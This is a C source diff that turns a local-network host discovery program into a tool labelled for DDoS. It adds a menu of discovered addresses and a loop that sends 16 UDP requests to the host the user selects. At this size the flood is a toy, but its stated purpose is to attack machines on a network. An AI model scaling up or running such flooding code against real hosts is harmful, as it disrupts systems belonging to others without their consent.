@@ -45,12 +45,15 @@ int main(void) {
   const char *CLEAN_CONSOLE = "\e[1;1H\e[2J";
   const long int MAX_TIME = 10; // 10 seconds
   const long int MAX_SIZE = (1 << (10)); // 1024 bytes
-
+  const int MAX_REQUEST = (1 << (4)); // 16
+ 
   // Variables
   int status = EXIT_FAILURE,
     udp_socket = 0,
     err = 0,
-    counter = 0;
+    counter = 0,
+    choice = 0;
+  double pourcent = 0.0;
   const char *request = NULL;
   time_t start_t = 0, end_t = 0;
 
@@ -222,21 +225,57 @@ int main(void) {
 
   if (err == -1) {
     perror("Error: write(..., CLEAN_CONSOLE, ...).\n");
-    close(udp_socket);
-    free(src_sock);
-    free(interface->ifa_netmask);
-    freeifaddrs(interface);
-    free(responds_sock_in);
-    exit(status);
+    goto End;
   }
 
   // Filters the list responds_sock_in and returns the new size
   counter = sockaddr_in_filter(&responds_sock_in, counter, &src_interface);
 
   // Displays address
-  printf("Found %d different(s) adress:\n", counter);
-  for(int i = 0; i < counter; i++) printf("\t%s\n",inet_ntoa(responds_sock_in[i].sin_addr));
+  printf("Choose address to DDOS:\n");
+  printf("0\tExit.\n");
+  for(int i = 0; i < counter; i++) printf("%d\t%s\n",(i + 1), inet_ntoa(responds_sock_in[i].sin_addr));
+
+  choice = 0;
+  err = scanf("%d", &choice);
   
+  if (err == -1) {
+    perror("Error: scanf().\n");
+    goto End;
+  }
+
+  if (choice == 0) goto End;
+  
+  if (choice < 0 || choice > counter) {
+    perror("Invalid choice!\n");
+    goto End;
+  }
+
+  // DDOS choosen_one address
+  struct sockaddr_in choosen_one = responds_sock_in[choice - 1];
+  printf("Sending %d requests to %s:\n", MAX_REQUEST, inet_ntoa(choosen_one.sin_addr));
+  counter = 0;
+  
+  // Loop
+  do {
+      err = sendto(udp_socket, // sending socket
+	       request, // ~ 'message'
+	       (strlen(request) + 1), // length of request
+	       0, // flag
+	       (struct sockaddr *)&choosen_one, // destination
+		   sizeof(choosen_one));
+
+      if (err == -1) {
+	perror("Error DDOSing.\n");
+	counter = MAX_REQUEST;
+      }
+      counter++;
+      pourcent = ((double)counter / (double)MAX_REQUEST) * 100;
+      if ((int)pourcent % 5) printf(".....");
+  } while (counter < MAX_REQUEST);
+  printf("\nRequests sent!\n");
+  
+ End:
   // Closes UDP socket
   err = close(udp_socket);
 
